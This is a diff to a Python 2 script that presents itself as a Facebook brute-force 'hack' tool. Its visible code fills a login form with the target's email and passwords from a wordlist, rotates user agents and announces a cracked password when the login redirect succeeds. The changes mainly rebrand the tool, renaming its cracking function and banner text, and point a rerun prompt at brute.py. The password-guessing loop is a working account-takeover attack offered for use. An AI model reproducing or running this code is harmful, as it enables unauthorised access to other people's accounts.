@@ -36,10 +36,8 @@ def runntxt(s):
 def banner():
     os.system('clear')
     print " "
-    print(" 💗💞Assalamu walaikum💞 💗")
-   
-
-	print (" Black Whale Cyber Source Team")
+    print(" 💗💞Assalamu walaikum💞 ")
+  
     time.sleep(1.5)
     print GG+"  √=============================================√"
     print GL+"  |?👉👉NEW TOOLS HACK FACEBOOK BF👈👈|"
@@ -71,7 +69,7 @@ def pil():
                 print GG+" "
                 g = str(raw_input("[?] Hack Fb lagi..\033[93;1m[y/n]: "))
                 if g == 'y' or g == 'Y':
-                    os.system('python2 fbclone.py')
+                    os.system('python2 brute.py')
                 elif g == 'n' or g == 'N':
                     print wd+"Keluar dari program..."
                     sys.exit()
@@ -111,24 +109,24 @@ def main():
         print " "
 	
 
-def darkrevel(darkrevel_password):
+def iqbalz(iqbalz_password):
   try:
- 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Cracking ==> \033[91m[\033[90;1m"+darkrevel_password)
+ 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Cracking ==> \033[91m[\033[90;1m"+iqbalz_password)
 	sys.stdout.flush()
 	noobs.addheaders = [('User-agent', random.choice(useragents))]
 	site = noobs.open(login)
 	noobs.select_form(nr = 0)
 	noobs.form['email'] = email_target
-	noobs.form['pass'] = darkrevel_password
+	noobs.form['pass'] = iqbalz_password
 	tom = noobs.submit()
 	mask = tom.geturl()
 	if mask != login and (not 'login_attempt' in mask):
                         print " "
 			print ("\033[96m  Congratulation You are Success")
-			print "          Password cracking successful😍 "
+			print "          Password crecking successful😍 "
                   	print RR+"+-------------------------------------------+"
 	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
-        	        print (RR+"#\033[97m Password Target:\033[92m {}").format(darkrevel_password)
+        	        print (RR+"#\033[97m Password Target:\033[92m {}").format(iqbalz_password)
         	        print " "
         	        raw_input(WW+"Log in This account in Id code and Password ...")
 			sys.exit(1)
@@ -173,8 +171,8 @@ def runn_noobs():
          nuub = open(password_list, 'r')
          nuub = nuub.readlines()
          print wd+" [#] ID / Username Target\033[97;1m: {}".format(email_target)
-         print wd+" [#] Finding Password\033[97;1m:", len(nuub),'password'
-         print wd+" [#] Proses Cracking\033[97;1m.........."
+         print wd+" [#] JUmlah Password saat ini\033[97;1m:", len(nuub),'password'
+         print wd+" [#] Tunggu Proses Cracking\033[97;1m.........."
          print " "
 
 raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
